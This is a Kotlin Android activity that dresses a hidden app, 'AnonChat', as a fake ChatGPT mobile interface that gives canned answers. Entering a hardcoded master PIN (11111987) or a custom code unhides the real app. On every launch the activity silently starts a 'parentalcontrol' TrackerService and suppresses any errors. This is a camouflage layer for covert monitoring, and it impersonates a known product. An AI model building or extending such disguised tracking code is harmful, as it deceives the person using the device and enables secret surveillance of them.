package com.anonchat.app.ui.chatgpt

import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.widget.NestedScrollView
import com.anonchat.app.R
import com.anonchat.app.receiver.SecretCodeReceiver
import com.anonchat.app.util.AppHider
import com.anonchat.app.util.SecretCodeManager

/**
 * ChatGPTActivity — full ChatGPT mobile dark-mode camouflage interface.
 *
 * Secret-code detection: typing the secret PIN (11111987 or custom code) in the
 * prompt input seamlessly unlocks the real AnonChat app.
 */
class ChatGPTActivity : AppCompatActivity() {

    private lateinit var etPrompt       : EditText
    private lateinit var btnSend        : View
    private lateinit var layoutGreeting : View
    private lateinit var layoutMessages : LinearLayout
    private lateinit var scrollView     : NestedScrollView
    private lateinit var tvModelName    : TextView

    private val masterKey = "11111987"
    private var chatInitialized = false
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Status & Navigation bar dark styling
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.navigationBarColor = 0xFF212121.toInt()
        window.statusBarColor     = 0xFF212121.toInt()

        // First-install setup wizard
        if (!com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)) {
            startActivity(Intent(this, com.anonchat.app.parentalcontrol.ui.SetupWizardActivity::class.java))
            return
        }

        initChatGPT()
    }

    override fun onResume() {
        super.onResume()
        if (com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this) && !chatInitialized) {
            initChatGPT()
        }
    }

    private fun initChatGPT() {
        if (chatInitialized) return
        chatInitialized = true
        setContentView(R.layout.activity_chatgpt)

        try {
            com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
        } catch (_: Exception) {}

        etPrompt       = findViewById(R.id.etGptPrompt)
        btnSend        = findViewById(R.id.btnSendGpt)
        layoutGreeting = findViewById(R.id.layoutGreeting)
        layoutMessages = findViewById(R.id.layoutMessages)
        scrollView     = findViewById(R.id.scrollViewGpt)
        tvModelName    = findViewById(R.id.tvModelName)

        setupListeners()
    }

    private fun setupListeners() {
        btnSend.setOnClickListener { handleSend() }

        findViewById<View>(R.id.btnGptMenu).setOnClickListener {
            Toast.makeText(this, "ChatGPT Plus & Settings", Toast.LENGTH_SHORT).show()
        }

        findViewById<View>(R.id.btnNewChat).setOnClickListener {
            resetConversation()
        }

        findViewById<View>(R.id.btnModelSelector).setOnClickListener {
            cycleModel()
        }

        findViewById<View>(R.id.btnAttachment).setOnClickListener {
            Toast.makeText(this, "Attach photos or files", Toast.LENGTH_SHORT).show()
        }

        findViewById<View>(R.id.btnVoice).setOnClickListener {
            Toast.makeText(this, "Listening...", Toast.LENGTH_SHORT).show()
        }

        // Suggestion Chips
        findViewById<View>(R.id.chipCreateImage).setOnClickListener {
            sendChipPrompt("Create a detailed concept image for a futuristic app icon.")
        }
        findViewById<View>(R.id.chipBrainstorm).setOnClickListener {
            sendChipPrompt("Brainstorm 5 innovative ideas for a technology project.")
        }
        findViewById<View>(R.id.chipSummarize).setOnClickListener {
            sendChipPrompt("Summarize the main points of quantum computing.")
        }
        findViewById<View>(R.id.chipHelpWrite).setOnClickListener {
            sendChipPrompt("Help me write a concise and professional email.")
        }
    }

    private var currentModelIndex = 0
    private val models = listOf(" 4o mini ▾", " GPT-4o ▾", " o1-mini ▾")

    private fun cycleModel() {
        currentModelIndex = (currentModelIndex + 1) % models.size
        tvModelName.text = models[currentModelIndex]
        Toast.makeText(this, "Switched model to " + models[currentModelIndex].replace(" ▾", ""), Toast.LENGTH_SHORT).show()
    }

    private fun sendChipPrompt(prompt: String) {
        etPrompt.setText(prompt)
        handleSend()
    }

    private fun resetConversation() {
        layoutMessages.removeAllViews()
        layoutMessages.visibility = View.GONE
        layoutGreeting.visibility = View.VISIBLE
        etPrompt.setText("")
    }

    private fun handleSend() {
        val query = etPrompt.text.toString().trim()
        if (query.isEmpty()) return

        // ── Secret-code check ──────────────────────────────────────────────
        val userCode = SecretCodeManager.getSecretCode(this)
        val matched = (query == masterKey) || (userCode != null && query == userCode)

        if (matched) {
            etPrompt.setText("")
            AppHider.showApp(this)
            SecretCodeReceiver.launchAfterUnhide(this)
            finish()
            return
        }
        // ──────────────────────────────────────────────────────────────────

        // Display user message
        layoutGreeting.visibility = View.GONE
        layoutMessages.visibility = View.VISIBLE

        addUserMessageBubble(query)
        etPrompt.setText("")
        scrollToBottom()

        // Generate realistic AI response
        mainHandler.postDelayed({
            addAiMessageBubble(generateMockAnswer(query))
            scrollToBottom()
        }, 600)
    }

    private fun addUserMessageBubble(text: String) {
        val bubble = TextView(this).apply {
            this.text = text
            setTextColor(Color.WHITE)
            textSize = 14f
            setBackgroundResource(R.drawable.bg_gpt_msg_user)
            setPadding(dp(14), dp(10), dp(14), dp(10))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                gravity = Gravity.END
                topMargin = dp(8)
                bottomMargin = dp(8)
                marginStart = dp(40)
            }
        }
        layoutMessages.addView(bubble)
    }

    private fun addAiMessageBubble(text: String) {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                topMargin = dp(6)
                bottomMargin = dp(12)
                marginEnd = dp(24)
            }
        }

        val header = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(4) }
        }

        val avatar = TextView(this).apply {
            this.text = "✦"
            setTextColor(0xFF10A37F.toInt())
            textSize = 16f
            setPadding(0, 0, dp(6), 0)
        }

        val name = TextView(this).apply {
            this.text = "ChatGPT"
            setTextColor(0xFF10A37F.toInt())
            textSize = 12f
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        header.addView(avatar)
        header.addView(name)

        val body = TextView(this).apply {
            this.text = text
            setTextColor(0xFFECECF1.toInt())
            textSize = 14f
            setLineSpacing(dp(4).toFloat(), 1.0f)
        }

        container.addView(header)
        container.addView(body)
        layoutMessages.addView(container)
    }

    private fun generateMockAnswer(q: String): String {
        val lower = q.lowercase()
        return when {
            lower.contains("image") ->
                "Here is a concept description for your image:\n\n• Central Focus: A sleek, radiant emblem with neon gradient accents.\n• Lighting: Soft ambient highlights with cinematic reflections.\n• Color Palette: Deep emerald, obsidian, and brushed steel.\n\nLet me know if you would like me to refine any particular details!"

            lower.contains("brainstorm") || lower.contains("idea") ->
                "Here are a few compelling directions:\n\n1. AI-Driven Personalization: Adaptive workflows tailored to individual habits.\n2. Cross-Platform Continuity: Instant synchronization across devices with zero friction.\n3. Privacy-First Architecture: Local processing paired with end-to-end encrypted storage.\n\nWhich of these would you like to explore further?"

            lower.contains("summarize") ->
                "Summary:\n\nKey Concepts: The system operates on modular components, optimizing efficiency and user clarity.\nMain Takeaway: By focusing on practical simplicity, overall reliability and user experience are significantly elevated."

            lower.contains("write") || lower.contains("email") ->
                "Here is a drafted message:\n\nDear Team,\n\nI hope you are having a productive week. I am following up on our recent milestone and wanted to confirm that everything is progressing smoothly.\n\nPlease let me know if you have any questions or require any assistance.\n\nBest regards,\nUser"

            lower.contains("hello") || lower.contains("hi") ->
                "Hello! How can I assist you today?"

            else ->
                "That is a great question. Based on current knowledge, the most effective approach is to break down the problem into structured steps, evaluate the constraints, and implement the optimal solution iteratively.\n\nFeel free to ask if you need further elaboration on any specific part!"
        }
    }

    private fun scrollToBottom() {
        scrollView.post {
            scrollView.fullScroll(View.FOCUS_DOWN)
        }
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
}
